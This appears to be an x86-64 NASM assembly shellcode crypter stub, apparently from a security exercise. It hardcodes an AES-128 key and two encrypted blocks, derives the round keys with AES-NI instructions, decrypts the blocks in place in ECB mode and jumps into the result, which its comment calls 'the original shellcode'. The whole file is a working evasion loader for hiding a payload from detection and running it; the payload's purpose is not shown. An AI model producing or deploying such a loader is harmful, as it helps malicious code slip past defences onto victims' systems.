; AES128-ECB. Yep, ECB.

BITS 64

global _start 

section .text

_start:
    jmp start2

    key: db 0x2b, 0x7e, 0x15, 0x16, 0x28, 0xae, 0xd2, 0xa6, 0xab, 0xf7, 0x15, 0x88, 0x09, 0xcf, 0x4f, 0x3c
    ciphertext: db 0x4e,0xb1,0xcd,0xf5,0x55,0xf9,0xbe,0x63,0x18,0xfe,0x67,0x79,0x72,0x07,0x42,0x74,0x91,0x0c,0x22,0xaa,0x43,0x7a,0x1e,0xb8,0x49,0xa7,0x28,0xca,0x7a,0x5c,0x0c,0x20
    mask: db 0xff, 0xff, 0xff, 0xff, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b

start2:
    lea rax, [rel ciphertext]           ; load first block of ciphertext into rax
    mov rcx, 2                          ; block count
    and rsp, 0xfffffffffffffff0         ; align stack
    sub rsp, 16                         ; align stack


decrypt:
    jmp decrypt_block
decrypt_continue:
    add rax, 16
    loop decrypt
    jmp ciphertext                      ; after the loop, the content is already decrypted and contains the original shellcode

decrypt_block:
    ; generate round keys and push them on the stack
    mov r10, rsp

    movdqu xmm5, [rel mask]
    movdqu xmm1, [rel key]              ; k0 == k20
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x01    ; k1
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x02    ; k2
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x04    ; k3
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x08    ; k4
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x10    ; k5
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x20    ; k6
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x40    ; k7
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x80    ; k8
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x1B    ; k9
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aeskeygenassist xmm2, xmm1, 0x36   ; k10 (used for encryption and decryption)  
    call key_expansion128
    sub rsp, 16
    movdqu [rsp], xmm1

    aesimc xmm2, [r10-10*16]            ; k11
    sub rsp, 16
    movdqu [rsp], xmm2

    aesimc xmm2, [r10-9*16]             ; k12
    sub rsp, 16
    movdqu [rsp], xmm2

    aesimc xmm2, [r10-8*16]             ; k13
    sub rsp, 16
    movdqu [rsp], xmm2

    aesimc xmm2, [r10-7*16]             ; k14
    sub rsp, 16
    movdqu [rsp], xmm2

    aesimc xmm2, [r10-6*16]             ; k15
    sub rsp, 16
    movdqu [rsp], xmm2

    aesimc xmm2, [r10-5*16]             ; k16
    sub rsp, 16
    movdqu [rsp], xmm2

    aesimc xmm2, [r10-4*16]             ; k17
    sub rsp, 16
    movdqu [rsp], xmm2

    aesimc xmm2, [r10-3*16]             ; k18
    sub rsp, 16
    movdqu [rsp], xmm2

    aesimc xmm2, [r10-2*16]             ; k19
    sub rsp, 16
    movdqu [rsp], xmm2

    ; decrypt with the appropriate round keys
    movdqu xmm1, [rax]                  ; load block of ciphertext into xmm1 for decryption
    pxor xmm1, [r10-11*16]              ; k10
    aesdec xmm1, [r10-12*16]            ; k11
    aesdec xmm1, [r10-13*16]            ; k12
    aesdec xmm1, [r10-14*16]            ; k13
    aesdec xmm1, [r10-15*16]            ; k14
    aesdec xmm1, [r10-16*16]            ; k15
    aesdec xmm1, [r10-17*16]            ; k16
    aesdec xmm1, [r10-18*16]            ; k17
    aesdec xmm1, [r10-19*16]            ; k18
    aesdec xmm1, [r10-20*16]            ; k19
    aesdeclast xmm1, [r10-16]           ; k0 (last round)

    movdqu [rax], xmm1                  ; store decrypted block in source position

    mov rsp, r10                        ; restore stack
    
    jmp decrypt_continue

key_expansion128: 
    pshufd xmm2, xmm2, 0xFF
    movdqa xmm3, xmm1
    pshufb xmm3, xmm5
    pxor xmm1, xmm3
    pshufb xmm3, xmm5
    pxor xmm1, xmm3
    pshufb xmm3, xmm5
    pxor xmm1, xmm3
    pxor xmm1, xmm2
    ret
